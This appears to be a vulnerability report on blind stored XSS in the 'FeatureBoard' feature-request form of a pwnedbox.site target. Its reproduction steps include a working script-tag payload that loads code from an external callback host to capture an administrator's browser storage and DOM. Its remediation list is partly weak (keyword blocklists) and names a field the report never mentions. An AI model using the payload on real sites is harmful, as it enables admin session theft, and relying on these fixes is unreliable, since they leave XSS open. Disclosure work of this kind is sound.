## Title
Blind XSS - FeatureBoard Feature Requests

## Description
**Affected URL:** https://featureboard.pwnedbox.site/

The FeatureBoard feature request form accepts user-controlled input in the Feature title, description, and name fields. The submitted content is stored and later displayed in the feature request page and the admin feedback inbox.

A script-based payload referencing an external XSS callback endpoint was submitted through these fields. The stored content is visible in the request page and admin dashboard, creating a potential blind XSS issue if the content is rendered as executable HTML or JavaScript in an administrator's browser.

## Steps to Reproduce

1. Open the following URL in a browser: https://featureboard.pwnedbox.site/index.php
2. Enter the following payload in the Feature title field: `"><script src=https://xss.report/c/priyanshxop></script>`
3. Enter the same payload in the “What would you like to see?” description field.
4. Enter the same payload in the “Your name” field.
5. Select a category, provide an email address, and click Publish request.
6. Open the newly created feature request and observe that the submitted content is stored and displayed.
7. Open the admin area and review the Feedback inbox. The submitted request and submitter information appear in the dashboard.
8. Check the configured XSS callback endpoint for any callback generated when the stored content is viewed.


## POC (Proof of Concept)

Screenshot 1: Payload entered in Feature title, description, and name fields before submission.

<img width="1911" height="971" alt="image" src="https://github.com/user-attachments/assets/f2feb638-5010-454d-8522-890580293c66" />

Screenshot 2: Submitted feature request page showing the discussion contact, email and name.

<img width="1912" height="977" alt="image" src="https://github.com/user-attachments/assets/abbe631e-c585-42bf-b562-13a7ad98bca9" />

Screenshot3: FeatureBoard admin login page.

<img width="1918" height="966" alt="image" src="https://github.com/user-attachments/assets/69581ba5-776a-41a8-8d75-223a944122f0" />

Screenshot 4: Admin Feedback inbox displaying the submitted feature request and submitter information.

<img width="1918" height="967" alt="image" src="https://github.com/user-attachments/assets/e8dd4f9b-a9fc-418d-92b6-22debf1bfa96" />

Screenshot 5: XSS.report page showing browser storage and DOM information for the admin dashboard.

<img width="1918" height="957" alt="image" src="https://github.com/user-attachments/assets/fbe4af68-f8ff-4840-8563-3fc0b39b7cee" />

<img width="1917" height="957" alt="image" src="https://github.com/user-attachments/assets/18e133cb-7a0c-470b-927a-ab2d627d88f3" />


## Impact
- An attacker may execute JavaScript in an administrator's authenticated browser session.
- Sensitive information accessible to the administrator's page, including session-related or browser storage data, may be exposed if accessible to the injected script.
- The attacker may perform unauthorized actions through the administrator's session, depending on the application's permissions and protections.


## Remediation
- Filter out HTML tags like: `<script>`, `<img>`, `<svg>` from the Report Name field before saving anything to the database
- Filter out JavaScript methods like: `alert()`, `confirm()`, `prompt()` so even if a tag slips through the method won't execute
- If you're using PHP then use `htmlspecialchars()` function before rendering any user input back to the page
- Use Cloudflare as they have so many WAF rules that almost all XSS payloads will be blocked automatically before even reaching the server
